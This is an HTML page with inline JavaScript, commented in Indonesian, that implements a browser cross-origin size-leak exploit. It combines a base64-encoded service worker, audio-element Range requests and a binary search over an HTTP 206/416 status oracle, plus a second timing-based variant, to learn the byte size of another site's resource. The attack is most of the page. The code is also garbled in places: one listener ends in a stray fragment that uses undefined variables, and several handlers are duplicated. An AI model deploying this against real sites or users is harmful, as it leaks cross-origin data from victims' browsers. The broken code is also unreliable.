<body>
    
    <h1>Cross-origin size leak</h1>
    <small>Compatible with <strong>GitHub Pages & Chrome</strong> - Base64 SW Engine</small>

    <div class="panel">
        <form id="form" method="POST">
          <input name="url" id="target-url" placeholder="https://google.com" value="https://google.com"/>
          <button type="submit">Run Search Chain</button>
          <button id="export-log-report" type="button" style="background: #142414; display: none;">Download Technical Report (.TXT)</button>
        </form>
    </div>

    <div id="result"></div>

    <script>
        const result = document.getElementById("result");
        const form = document.getElementById("form");
        let auditReports = []; 

        // 1. REKAYASA INTEGRASI WORKER: Enkapsulasi Logika sw.js Asli Luan Herrera ke String Teks
        const rawWorkerScript = `
            'use strict';
            let response;
            self.addEventListener("install", () => { self.skipWaiting(); });
            self.addEventListener("activate", (e) => { e.waitUntil(self.clients.claim()); });
            self.addEventListener("fetch", async (e) => {
                if (!e.request.url.includes('size=')) return;
                
                let url = new URL(e.request.url);
                let urlParams = new URLSearchParams(url.search);
                let size = urlParams.get("size");
                let body = "A".repeat(Number(size));

                // Taktik Kerentanan: Mengirimkan status partial 206 jika jangkauan Range di-request oleh elemen audio
                if (e.request.headers.get("range") === "bytes=0-") {
                    e.respondWith(new Response(body, {status: 206, headers: {
                        "Content-Type": "audio/mp4",
                        "Content-Range": "bytes 0-1/13337"
                    }}));
                } else if (e.request.headers.get("range") === "bytes=" + Number(size) + "-") {
                    // Meneruskan request sisa jangkauan byte ke server lintas asal menggunakan Fetch API
                    response = await fetch(e.request);
                } else if (e.request.url.includes("/mock.css")) {
                    e.respondWith(response.clone());
                }
            });
        `;

        // Mengonversi script worker teks ke skema Data-URI Base64 untuk mematuhani aturan registrasi Chrome
        if ("serviceWorker" in navigator) {
            const base64Script = btoa(unescape(encodeURIComponent(rawWorkerScript)));
            const dataUriWorker = `data:text/javascript;base64,${base64Script}`;

            navigator.serviceWorker.register(dataUriWorker).then(registration => {
                if (!navigator.serviceWorker.controller) {
                    // Force-reload satu kali untuk menempelkan kontroler virtual worker pada halaman DOM
                    writeLog('SYSTEM', 'info', "Menginisialisasi modul memori Service Worker... Melakukan penyegaran halaman.");
                    setTimeout(() => { location.reload(); }, 250);
                }
            }).catch(err => {
                console.error("Gagal mendaftarkan Base64 Service Worker: ", err);
            });
        }

        // 2. LOGIKA KENDALI PIPELINE: INTEGRASI ALGORITMA ORACLE LUAN HERRERA
        const binarySearchSize = async (url, minSize, maxSize) => {
            let foundSize = -1;
            document.getElementById("export-log-report").style.display = "none";
            
            // Mekanisme Keamanan Ganda: Jika Service Worker diblokir domain, ingatkan penguji
            if (!navigator.serviceWorker || !navigator.serviceWorker.controller) {
                writeLog('ERROR', 'error', "Kontroler Service Worker tidak aktif pada sesi ini. Pastikan Anda mengakses via HTTPS nyata.");
                return;
            }

            writeLog('INIT', 'success', `Memulai komputasi pipa biner berbasis Oracle Status 416 (Bypass resource_loader.cc)...`);
            
            while (minSize <= maxSize) {
                let mid = Math.floor((minSize + maxSize) / 2);
                
                // Menunggu pemrosesan jabat tangan asinkron selesai secara sekuensial
                let isAtLeastMid = await checkSizeThroughOracle(url, mid);
                
                if (isAtLeastMid) {
                    writeLog(`MID-${mid}`, 'error', `Uji Vektor: Kapasitas dokumen terbukti melampaui skala ${mid} bytes.`);
                    foundSize = mid + 1;
                    minSize = mid + 1;
                } else {
                    writeLog(`MID-${mid}`, 'success', `Uji Vektor: Kapasitas dokumen berada di bawah skala ${mid} bytes.`);
                    maxSize = mid - 1;
                }
                
                // Jeda mikro memberikan stabilitas pembersihan memori objek perulangan pada mesin JavaScript
                await new Promise(r => setTimeout(r, 20));
            }
            writeLog('SUCCESS', 'success', `=== RANTAI EKSPLOITASI PENUH SELESAI ===`);
            writeLog('SUCCESS', 'success', `Kapasitas ukuran byte eksak berkas target tervalidasi -> <b>${foundSize}</b> bytes.`);
            document.getElementById("export-log-report").style.display = "inline-block";
        };

        // 3. PIPELINE ORACLE INTERUPSI STATUS (Sesuai rincian resource_loader.cc:950-958)
        const checkSizeThroughOracle = (url, size) => {
            return new Promise((resolve) => {
                let sound = document.createElement("audio");
                
                const terminateAndResolve = async (isTrueSize) => {
                    if (sound) {
                        sound.src = ""; 
                        sound.onerror = null;
                        sound.remove();
                        sound = null; 
                    }
                    resolve(isTrueSize);
                };

                sound.onerror = async () => {
                    try {
                        // Sesuai Aturan Celah: Memanggil berkas maket /mock.css dengan mode no-cors
                        // Jika status 416 (Target < Size), proteksi resource_loader.cc dilewati -> fetch sukses (resolve false)
                        // Jika status 206 (Target > Size), proteksi resource_loader.cc memutus koneksi -> fetch error (resolve true)
                        await fetch("/mock.css?size=" + size + "&cb=" + Math.random(), { mode: "no-cors" });
                        terminateAndResolve(false);
                    } catch(err) {
                        terminateAndResolve(true);
                    }
                };
                
                document.body.appendChild(sound);
                sound.src = `${url}?size=${size}&cb=${Math.random()}`;
            });
        };

        function writeLog(phase, type, text) {
            const timestamp = new Date().toLocaleTimeString();
            auditReports.push(`[${timestamp}] [${phase.toUpperCase()}] [${type.toUpperCase()}] ${text.replace(/<[^>]*>/g, '')}`);
            result.innerHTML += `<p class="${type}">[${timestamp}] [${phase}] ${text}</p>`;
            result.scrollTop = result.scrollHeight;
        }

        form.onsubmit = async (e) => {
            e.preventDefault();
            let url = document.getElementById("target-url").value.trim();
            auditReports = []; 
            result.innerHTML = "";
            binarySearchSize(url, 1, 15000);
        };

        // MODUL LAYANAN EKSPOR BERKAS LAPORAN TEKNIS AUDIT LAB
        document.getElementById("export-log-report").addEventListener("click", () => {
            if (auditReports.length === 0) return;
            
            const textBlob = new Blob([auditReports.join("\r\n")], { type: "text/plain" });
            const downloadAnchor = document.createElement("a");
            
            downloadAnchor.download = `size_leak_oracle_report_${Math.round(Date.now()/1000)}.txt`;
            downloadAnchor.href = window.URL.createObjectURL(textBlob);
            downloadAnchor.style.display = "none";
            
            document.body.appendChild(downloadAnchor);
            const timestamp = new Date().toLocaleTimeString();
            let tag = `<span class="role-tag ${type}">${type.toUpperCase()}</span>`;
            auditReports.push(`[${timestamp}] [${phase.toUpperCase()}] [${type.toUpperCase()}] ${text}`);
            result.innerHTML += `<p class="${type}">[${timestamp}] [${phase}] ${text}</p>`;
            result.scrollTop = result.scrollHeight;
        }

        // PIPELINE UTAMA: ASYNC CONCURRENCY & PRECISION RESOURCETIMING MATRIX
        const executeHardenedChain = async (url) => {
            writeLog('INIT', 'info', "Memulai inisialisasi pipa pencarian biner presisi tinggi...");
            
            let minSize = 1;
            let maxSize = 15000; // Mengakomodasi batas atas ukuran file robots.txt standar
            let foundSize = -1;

            while (minSize <= maxSize) {
                let mid = Math.floor((minSize + maxSize) / 2);
                
                // Meluncurkan verifikasi paralel iteratif untuk menstabilkan metrik dari degradasi jaringan
                let sampleResults = await Promise.all([
                    verifySizeSideChannel(url, mid),
                    verifySizeSideChannel(url, mid),
                    verifySizeSideChannel(url, mid)
                ]);

                // Menggunakan konsensus mayoritas hasil sampling untuk mengeliminasi pencilan (outliers)
                let positiveResponses = sampleResults.filter(res => res === true).length;
                let isAtLeastMid = positiveResponses >= 2;

                if (isAtLeastMid) {
                    writeLog(`MID-${mid}`, 'error', `Vektor Validasi: Kapasitas dokumen terbukti melampaui skala ${mid} bytes.`);
                    foundSize = mid + 1;
                    minSize = mid + 1;
                } else {
                    writeLog(`MID-${mid}`, 'info', `Vektor Validasi: Kapasitas dokumen berada di bawah skala ${mid} bytes.`);
                    maxSize = mid - 1;
                }

                // Siklus pembersihan mikro memori runtime
                await new Promise(r => setTimeout(r, 15));
            }
            
            writeLog('SUCCESS', 'success', `=== RANTAI EKSPLOITASI SELESAI ===`);
            writeLog('SUCCESS', 'success', `Ukuran tepat dokumen lintas asal terdeteksi: <b>${foundSize}</b> bytes.`);
            document.getElementById("export-log-report").style.display = "inline-block";
        };

        // ENGINES STRATEGI: Mengukur Kebocoran Batas Ukuran via Media Element Error Latency
        const verifySizeSideChannel = (url, size) => {
            return new Promise((resolve) => {
                const uniqueId = `cb_${Math.floor(Math.random() * 10000000)}`;
                const targetUrl = `${url}?size=${size}&${uniqueId}`;
                
                const startTime = performance.now();
                let audioNode = document.createElement("audio");

                const extractTimingMetrics = () => {
                    // Mengekstrak jejak durasi pemuatan langsung dari High-Precision Performance Timeline
                    const entries = performance.getEntriesByName(targetUrl);
                    const duration = entries.length > 0 ? entries[0].duration : (performance.now() - startTime);

                    // Aturan Diferensiasi Saluran Samping (Side-Channel Rules):
                    // Jika kesalahan pemuatan media dilemparkan sangat cepat (< 140ms), tumpukan internal 
                    // mengonfirmasi respons penolakan parsing muatan (Range Not Satisfiable).
                    if (duration < 140) {
                        cleanupNode(audioNode);
                        resolve(false);
                    } else {
                        cleanupNode(audioNode);
                        resolve(true);
                    }
                };

                // Mengikat penanganan multi-event untuk mencegah hilangnya status interupsi
                audioNode.onerror = extractTimingMetrics;
                audioNode.onstalled = extractTimingMetrics;
                audioNode.onabort = extractTimingMetrics;

                document.body.appendChild(audioNode);
                audioNode.src = targetUrl;
            });
        };

        function cleanupNode(element) {
            if (element) {
                element.src = "";
                element.onerror = null;
                element.onstalled = null;
                element.onabort = null;
                element.remove();
            }
        }

        form.onsubmit = async (e) => {
            e.preventDefault();
            let url = document.getElementById("target-url").value.trim();
            if (window.performance) { performance.clearResourceTimings(); }
            result.innerHTML = "";
            executeHardenedChain(url);
        };

        document.getElementById("export-log-report").addEventListener("click", () => {
            if (auditReports.length === 0) return;
            const textBlob = new Blob([auditReports.join("\r\n")], { type: "text/plain" });
            const downloadAnchor = document.createElement("a");
            downloadAnchor.download = `hardened_size_leak_report_${Date.now()}.txt`;
            downloadAnchor.href = window.URL.createObjectURL(textBlob);
            downloadAnchor.style.display = "none";
            document.body.appendChild(downloadAnchor);
            downloadAnchor.click();
            downloadAnchor.remove();
        });
    </script>
